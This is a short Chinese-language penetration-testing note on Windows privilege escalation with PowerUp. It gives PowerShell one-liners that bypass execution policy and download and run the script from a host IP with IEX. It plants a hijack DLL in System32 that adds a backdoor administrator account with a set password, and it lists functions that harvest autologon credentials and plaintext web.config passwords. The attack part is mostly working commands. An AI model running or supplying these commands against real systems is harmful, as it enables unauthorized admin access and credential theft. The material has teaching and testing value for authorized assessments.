	检测有漏洞的服务
	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1');Invoke-AllChecks"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/153.png)

	>icacls C:\Windows\system32\\wlbsctrl.dll 查看文件权限，F为完全控制，M修改
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/154.png)

	在AbuseFunction中会显示利用语句。
	>powershell.exe -nop -exec bypass -c "IEX(New-Object net.webclient).DownloadString('http://192.168.0.107/ps/powertools/PowerUp/PowerUp.ps1'); Write-HijackDll -OutputFile 'C:\Windows\system32\\wlbsctrl.dll' -Command 'net user admin pass@Qwe1 /add&net localgroup administrators admin /add'"
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/155.png)
	
	重启电脑后会新增用户admin
![image](https://raw.githubusercontent.com/xiaoy-sec/Pentest_Note/master/img/156.png)

	查找可能劫持的进程
	>Find-ProcessDLLHijack
	查找环境变量中当前用户可修改的目录
	>Find-PathDLLHijack
	查找存在注册表中自动登录用户的平局
	>Get-RegistryAutoLogon
	查询trusted_service_path
	>Get-ServiceUnquoted
	查询当前用户可修改的注册表开机启动项
	>Get-ModifiableRegistryAutoRun
	查询当前用户可修改的计划任务项
	>Get-ModifiableScheduledTaskFile
	查询系统中所有web.config文件中的明文密码
	>Get-WebConfig
